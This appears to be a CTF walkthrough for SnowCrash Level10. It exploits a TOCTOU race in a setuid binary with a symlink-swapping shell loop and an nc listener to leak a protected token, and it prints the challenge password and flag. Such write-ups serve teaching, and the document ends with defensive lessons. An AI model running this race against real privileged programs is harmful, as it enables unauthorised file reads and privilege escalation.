# SnowCrash Level10 Walkthrough

## Overview

Level10 presents a **Time-of-Check to Time-of-Use (TOCTOU)** vulnerability in a setuid program. The challenge requires exploiting a race condition between permission checking and file access to read a protected token file.

## Initial Reconnaissance

In the home directory, we find two files:

```bash
level10@SnowCrash:~$ ls -la
total 28
dr-xr-x---+ 1 level10 level10   140 Mar  6  2016 .
d--x--x--x  1 root    users     340 Aug 30  2015 ..
-r-x------  1 level10 level10   220 Apr  3  2012 .bash_logout
-r-x------  1 level10 level10  3518 Aug 30  2015 .bashrc
-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
-r-x------  1 level10 level10   675 Apr  3  2012 .profile
-rw-------  1 flag10  flag10     26 Mar  5  2016 token
```

Key observations:

- `level10`: An executable with SUID bit set (runs as flag10)
- `token`: A protected file we need to read (readable only by flag10)

## Analyzing the Executable

Basic Program Behavior
Testing the executable reveals its functionality:

```bash
level10@SnowCrash:~$ ./level10
./level10 file host
       sends file to host if you have access to it
```

The program requires a file and host argument, then sends the file contents to the specified host if permissions allow.

## Attempting to Read the Token

Attempting to Read the Token

```bash
level10@SnowCrash:~$ ./level10 token localhost
You don't have access to token
```

## Understanding the Vulnerability

### Reverse Engineering Insights

Decompiling the program reveals:

1. It uses access() to check file permissions

2. Then uses open() to actually read the file

3. There's a race condition between these operations

From the access man page warning:

```text
  Warning: Using these calls to check if a user is authorized to,
       for example, open a file before actually doing so using open(2)
       creates a security hole, because the user might exploit the short
       time interval between checking and opening the file to manipulate
       it.  For this reason, the use of this system call should be
       avoided.  (In the example just described, a safer alternative
       would be to temporarily switch the process's effective user ID to
       the real ID and then call open(2).)
```

## TOCTOU Exploit Concept

We can exploit the time gap between:

1. access() checking permissions (as the current user)
2. open() reading the file (as flag10, due to SUID)

## Exploit Development

### Preparation

1. Create a dummy file we can read:

```bash
echo "test" > /tmp/fake
```

2. Set up a symlink switching script:

```bash
while true; do
    ln -sf /tmp/fake /tmp/exploit;
    ln -sf ~/token /tmp/exploit;
done &
```

### Launching the Exploit

1. In one terminal, run the level10 program repeatedly:

```bash
while true; do
    ./level10 /tmp/exploit 127.0.0.1;
done
```

2. In another terminal, start a listener:

```bash
nc -lk 6969
```

## Successful Exploitation

After running the exploit, we eventually receive the token contents:

```text
woupa2yuojeeaaed06riuj63c
```

## Privilege Escalation

1. Switch to flag10 user:

```bash
level10@SnowCrash:~$ su flag10
Password: woupa2yuojeeaaed06riuj63c
```

2. Get the final flag:

```bash
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```

## Technical Analysis

### Why the Exploit Works

1. **Race Condition**: The tiny window between access() and open() allows us to swap the symlink

2. **Timing**:
   access() checks /tmp/exploit pointing to /tmp/fake (allowed)
   We quickly switch it to point to ~/token
   open() follows the symlink to ~/token (allowed as flag10)

3. **Network Exfiltration**: The program sends the file contents over the network, allowing us to capture the token

## Key Learning Points

1. **TOCTOU Vulnerabilities**: Security checks must be atomic with operations
2. **Symlink Attacks**: Symbolic links can be dangerous with time-sensitive operations
3. **SUID Pitfalls**: Special permissions require careful programming
4. **Race Conditions**: Even nanosecond timing windows can be exploited

## Security Implications

This challenge demonstrates why:

- **access()** should never be used for security checks
- File operations should use open() with O_NOFOLLOW
- Privileged programs must be carefully audited for race conditions
- Temporary files and symlinks require special handling in secure code

## Next Steps

With the flag feulo4b72j7edeahuete3no7c, we can now proceed to Level11 of the SnowCrash challenge.
